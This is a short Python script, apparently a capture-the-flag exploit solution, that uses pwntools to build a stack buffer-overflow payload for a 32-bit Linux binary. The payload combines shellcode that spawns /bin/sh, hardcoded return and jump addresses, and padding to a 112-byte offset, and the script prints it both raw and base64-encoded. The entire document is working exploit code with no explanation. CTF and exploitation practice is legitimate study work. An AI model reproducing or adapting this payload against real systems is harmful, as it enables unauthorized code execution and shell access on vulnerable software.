import base64
import pwn

# From: `pwn shellcraft i386.linux.sh`
shellcode = bytes.fromhex('6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80')
#shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

exe_addr = pwn.p32(0x804ea10 + 4 + 4)
jmp_addr = pwn.p32(0x804ea10 + 4)

payload = exe_addr \
        + shellcode \
        + b'w' * (112 - len(shellcode) - 4 - 4) \
        + jmp_addr

print(payload)
print(base64.b64encode(payload))
